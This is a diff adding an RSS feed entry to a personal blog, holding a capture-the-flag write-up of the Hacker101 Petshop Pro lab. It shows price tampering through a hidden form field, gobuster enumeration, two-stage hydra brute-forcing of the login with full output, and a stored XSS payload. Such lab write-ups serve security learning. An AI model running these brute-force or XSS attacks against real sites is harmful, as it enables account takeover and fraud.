@@ -6,7 +6,97 @@
         <description>Recent content on Tanishq Chaudhary</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 13 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 19 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Hacker101 CTF: Petshop Pro Writeup</title>
+        <link>https://chaudhary1337.github.io/p/hacker101-ctf-petshop-pro-writeup/</link>
+        <pubDate>Mon, 19 Jul 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://chaudhary1337.github.io/p/hacker101-ctf-petshop-pro-writeup/</guid>
+        <description>&lt;h1 id=&#34;hacker101-ctf-petshop-pro-writeup&#34;&gt;Hacker101 CTF: Petshop Pro Writeup&lt;/h1&gt;
+&lt;h2 id=&#34;flag-0---snooping-around&#34;&gt;Flag 0 - Snooping Around&lt;/h2&gt;
+&lt;p&gt;Home page:
+&lt;img src=&#34;https://i.imgur.com/9KpnA8q.png&#34; alt=&#34;home page of petshop pro&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;Add to cart takes us to &lt;code&gt;/add/0&lt;/code&gt; or &lt;code&gt;/add/1&lt;/code&gt; for kitten/puppy respectively.
+&lt;code&gt;/cart&lt;/code&gt; is another path. Source code for &lt;code&gt;/checkout&lt;/code&gt; isn&amp;rsquo;t anything special:
+&lt;img src=&#34;https://i.imgur.com/ia1mbWp.png&#34; alt=&#34;checkout page showing list of items in the cart.&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;In the source code of &lt;code&gt;/cart&lt;/code&gt; I found:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;		&amp;lt;form action=&amp;quot;checkout&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+			&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;cart&amp;quot; value=&amp;quot;[[1, {&amp;amp;#34;logo&amp;amp;#34;: &amp;amp;#34;puppy.jpg&amp;amp;#34;, &amp;amp;#34;price&amp;amp;#34;: 7.95, &amp;amp;#34;name&amp;amp;#34;: &amp;amp;#34;Puppy&amp;amp;#34;, &amp;amp;#34;desc&amp;amp;#34;: &amp;amp;#34;8\&amp;amp;#34;x10\&amp;amp;#34; color glossy photograph of a puppy.&amp;amp;#34;}], [0, {&amp;amp;#34;logo&amp;amp;#34;: &amp;amp;#34;kitten.jpg&amp;amp;#34;, &amp;amp;#34;price&amp;amp;#34;: 8.95, &amp;amp;#34;name&amp;amp;#34;: &amp;amp;#34;Kitten&amp;amp;#34;, &amp;amp;#34;desc&amp;amp;#34;: &amp;amp;#34;8\&amp;amp;#34;x10\&amp;amp;#34; color glossy photograph of a kitten.&amp;amp;#34;}]]&amp;quot;&amp;gt;
+			&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Check Out&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
+		&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using a beautifier online, we get:
+&lt;code&gt;&amp;quot;[[1, {&amp;quot;logo&amp;quot;: &amp;quot;puppy.jpg&amp;quot;, &amp;quot;price&amp;quot;: 7.95, &amp;quot;name&amp;quot;: &amp;quot;Puppy&amp;quot;, &amp;quot;desc&amp;quot;: &amp;quot;8&amp;quot;x10&amp;quot; color glossy photograph of a puppy.&amp;quot;}], [0, {&amp;quot;logo&amp;quot;: &amp;quot;kitten.jpg&amp;quot;, &amp;quot;price&amp;quot;: 8.95, &amp;quot;name&amp;quot;: &amp;quot;Kitten&amp;quot;, &amp;quot;desc&amp;quot;: &amp;quot;8&amp;quot;x10&amp;quot; color glossy photograph of a kitten.&amp;quot;}]]&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Looks like we can specify the price here. *its free real estate*. Changing the price to 0, or reducing it gives as such:
+&lt;img src=&#34;https://i.imgur.com/hzVUJkV.png&#34; alt=&#34;changing the price to 0&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;I first URL decoded, then changed its value and then encoded it again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/jxqetAx.png&#34; alt=&#34;first flag found&#34;  /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;flag1---enumeration--brute-forcing&#34;&gt;Flag1 - Enumeration &amp;amp; Brute-forcing&lt;/h2&gt;
+&lt;p&gt;Doing some enumeration:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 108 -q -u http://MACHINE_IP/some_hex_was_here/
+/login                (Status: 200) [Size: 329]
+/static               (Status: 301) [Size: 186] [--&amp;gt; http://127.0.0.1/static/]
+/cart                 (Status: 200) [Size: 410]                               
+/edit                 (Status: 400) [Size: 192]                               
+/checkout             (Status: 405) [Size: 178]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The login page.
+&lt;img src=&#34;https://i.imgur.com/8lRDyRm.png&#34; alt=&#34;login page for admins&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;Maybe SQLI? Tried using sqlmap, didn&amp;rsquo;t work.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /some_hex_was_here/login HTTP/1.1
+
+...
+
+username=admin&amp;amp;password=admin
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s use hydra to bruteforce. First let&amp;rsquo;s get the username right. Once we have that, we can go for password. I say this becuase of the error mesasge we see was telling us &amp;ldquo;Invalid username&amp;rdquo;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ hydra -L /usr/share/wordlists/rockyou.txt -p &amp;quot;doesntmatter&amp;quot; MACHINE_IP http-post-form &amp;quot;/some_hex_was_here/login:username=^USER^&amp;amp;password=^PASS^:Invalid username&amp;quot; -t 32
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-19 05:55:40
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:14344399/p:1), ~448263 tries per task
+[DATA] attacking http-post-form://MACHINE_IP:80/some_hex_was_here/login:username=^USER^&amp;amp;password=^PASS^:Invalid username
+[STATUS] 1234.00 tries/min, 1234 tries in 00:01h, 14343165 to do in 193:44h, 32 active
+[STATUS] 1227.33 tries/min, 3682 tries in 00:03h, 14340717 to do in 194:45h, 32 active
+[STATUS] 1234.29 tries/min, 8640 tries in 00:07h, 14335759 to do in 193:35h, 32 active
+[80][http-post-form] host: MACHINE_IP   login: augusta   password: doesntmatter
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! Username is &lt;code&gt;augusta&lt;/code&gt;. Now for the password and its error message. Trying it out says &amp;ldquo;Invalid password&amp;rdquo;. Onto brute-forcing again!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ hydra -l augusta -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form &amp;quot;/some_hex_was_here/login:username=^USER^&amp;amp;password=^PASS^:Invalid password&amp;quot; -t 32
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-19 06:22:00
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
+[DATA] attacking http-post-form://MACHINE_IP:80/some_hex_was_here/login:username=^USER^&amp;amp;password=^PASS^:Invalid password
+[STATUS] 1187.00 tries/min, 1187 tries in 00:01h, 14343212 to do in 201:24h, 32 active
+[80][http-post-form] host: MACHINE_IP   login: augusta   password: eileen
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-19 06:24:17
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice. On the homepage is the flag! If the syntax confuses you, here&amp;rsquo;s a quick summary:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;-l flag to specify a username, -L for a list of usernames&lt;/li&gt;
+&lt;li&gt;similarly for -p and -P&lt;/li&gt;
+&lt;li&gt;http-post-form tells that there is a form being posted&lt;/li&gt;
+&lt;li&gt;the format is &amp;ldquo;path:user or pass combi:invalid error message&amp;rdquo;, colons spearate&lt;/li&gt;
+&lt;li&gt;-t is the number of threads&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;flag2---xss&#34;&gt;Flag2 - XSS&lt;/h2&gt;
+&lt;p&gt;I tried editing the price and the details, and it looks like all the details get updated, even for the items in the cart. That sounds nice.&lt;/p&gt;
+&lt;p&gt;After a lot of searching around and hunting, I got to: XSS. Yes, XSS in the name and descriptions!&lt;/p&gt;
+&lt;p&gt;I used: &lt;code&gt;&amp;lt;image src/onerror=prompt(8)&amp;gt;&lt;/code&gt; to attack.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/gC0u0aL.jpg&#34; alt=&#34;editing name and descriptions for the kitten image product&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;The shopping cart then shows the flag!
+&lt;img src=&#34;https://i.imgur.com/IV8NPRx.png&#34; alt=&#34;showing the flag in the shopping cart&#34;  /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lessons-learnt&#34;&gt;Lessons Learnt&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;always get the products for cheaper if you can&lt;/li&gt;
+&lt;li&gt;SQLI is cool, but bruteforcing saves the day&lt;/li&gt;
+&lt;li&gt;XSS is everywhere YEE&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>Hacker101 CTF: Micro-CMS v1 Writeup</title>
         <link>https://chaudhary1337.github.io/p/hacker101-ctf-micro-cms-v1-writeup/</link>
         <pubDate>Tue, 13 Jul 2021 00:00:00 +0000</pubDate>
